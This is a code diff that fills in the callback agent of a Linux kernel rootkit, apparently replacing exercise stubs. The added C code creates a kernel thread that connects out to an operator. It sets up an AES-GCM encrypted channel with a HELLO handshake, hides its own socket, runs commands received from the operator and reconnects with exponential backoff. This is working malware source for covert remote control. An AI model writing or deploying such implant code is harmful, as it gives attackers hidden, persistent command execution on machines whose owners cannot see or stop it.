@@ -1,57 +1,129 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Callback agent thread: connects OUT to the operator.
-//
-// The agent loop: connect -> auto-hide -> session loop -> auto-unhide
-// -> disconnect -> sleep with exponential backoff -> retry.
-// This is the reverse of a listener: the rootkit initiates contact.
-//
+// network/agent.c - Agent kthread: connect, handshake, session loop.
+#include <crypto/aead.h>
 #include <linux/delay.h>
+#include <linux/in.h>
 #include <linux/inet.h>
 #include <linux/kthread.h>
+#include <linux/net.h>
 #include <linux/random.h>
-#include <linux/string.h>
+#include <linux/slab.h>
 #include <net/net_namespace.h>
-#include <net/sock.h>
 
 #include "rootkit.h"
 
-static int rk_connect(struct socket **sockp)
+// Exchange encrypted HELLO to confirm both sides share the key.
+static int rk_handshake(struct rk_session *s)
 {
-	// TODO:
-	// 1. sock_create_kern(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-	// 2. Build sockaddr_in from rk_peer_address (in_aton) and rk_peer_port
-	// 3. kernel_connect
-	// 4. On failure: sock_release and set *sockp = NULL
-	return -ENOSYS;
+	u8 buf[32];
+	size_t len;
+	int error;
+
+	error = rk_send_sealed(s, (const u8 *)"HELLO", 5);
+	if (error)
+		return error;
+
+	error = rk_recv_sealed(s, buf, sizeof(buf), &len);
+	if (error)
+		return error;
+
+	if (len != 5 || memcmp(buf, "HELLO", 5) != 0)
+		return -EPROTO;
+
+	return 0;
 }
 
-static void rk_session_loop(struct rk_session *s)
+// Initialize AEAD transform and session state.
+static int rk_session_init(struct rk_session *sess, struct socket *sock)
 {
-	// TODO:
-	// While !kthread_should_stop:
-	//   rk_recv_sealed into buf (RK_BUF_MAX - 1)
-	//   NUL-terminate
-	//   rk_dispatch(s, buf)
-	//   Break on error
+	int error;
+
+	sess->tfm = crypto_alloc_aead("gcm(aes)", 0, 0);
+	if (IS_ERR(sess->tfm))
+		return PTR_ERR(sess->tfm);
+
+	error = crypto_aead_setauthsize(sess->tfm, RK_TAG_LEN);
+	if (error)
+		goto free_tfm;
+
+	error = crypto_aead_setkey(sess->tfm, rk_key, RK_KEY_LEN);
+	if (error)
+		goto free_tfm;
+
+	get_random_bytes(&sess->session_id, sizeof(sess->session_id));
+	sess->sock = sock;
+	sess->tx_seq = 0;
+	sess->rx_seq_expected = 0;
+	return 0;
+
+free_tfm:
+	crypto_free_aead(sess->tfm);
+	return error;
 }
 
+// Receive commands, dispatch, loop.
+static void rk_handle_session(struct rk_session *s)
+{
+	u8 *cmd;
+	size_t cmd_len;
+	int error;
+
+	cmd = kmalloc(RK_FRAME_MAX, GFP_KERNEL);
+	if (!cmd)
+		return;
+
+	while (!kthread_should_stop()) {
+		error = rk_recv_sealed(s, cmd, RK_FRAME_MAX, &cmd_len);
+		if (error)
+			break;
+
+		error = rk_dispatch(s, cmd, cmd_len);
+		if (error)
+			break;
+	}
+
+	kfree(cmd);
+}
+
+// Connect to the operator and run an encrypted session.
 int rk_agent_thread(void *data)
 {
-	// TODO: Main callback loop:
-	//
-	// delay_ms = rk_retry_base_ms
-	// While !kthread_should_stop:
-	//   1. rk_connect(&sock)
-	//   2. On failure: msleep_interruptible(delay_ms),
-	//      double delay_ms (cap at rk_retry_max_ms), continue
-	//   3. On success: reset delay_ms
-	//   4. Build rk_session: tfm = rk_tfm, sock, random session_id,
-	//      tx_seq = 0, rx_seq_expected = 0
-	//   5. rk_auto_hide(sock)
-	//   6. rk_session_loop(&session)
-	//   7. rk_auto_unhide()
-	//   8. kernel_sock_shutdown + sock_release
-	//   9. msleep_interruptible before retry
+	unsigned int delay_ms = retry_base_ms;
+
+	while (!kthread_should_stop()) {
+		struct rk_session sess;
+		struct socket *sock;
+		int error;
+
+		sock = rk_connect();
+		if (IS_ERR(sock))
+			goto retry;
+
+		error = rk_session_init(&sess, sock);
+		if (error)
+			goto close_retry;
+
+		error = rk_handshake(&sess);
+		if (error)
+			goto free_tfm;
+
+		delay_ms = retry_base_ms;
+		rk_auto_hide(sock);
+		rk_handle_session(&sess);
+		rk_auto_unhide();
+
+free_tfm:
+		crypto_free_aead(sess.tfm);
+close_retry:
+		kernel_sock_shutdown(sock, SHUT_RDWR);
+		sock_release(sock);
+retry:
+		if (!kthread_should_stop()) {
+			msleep_interruptible(delay_ms);
+			if (delay_ms < retry_max_ms)
+				delay_ms = min(delay_ms * 2, retry_max_ms);
+		}
+	}
+
 	return 0;
 }
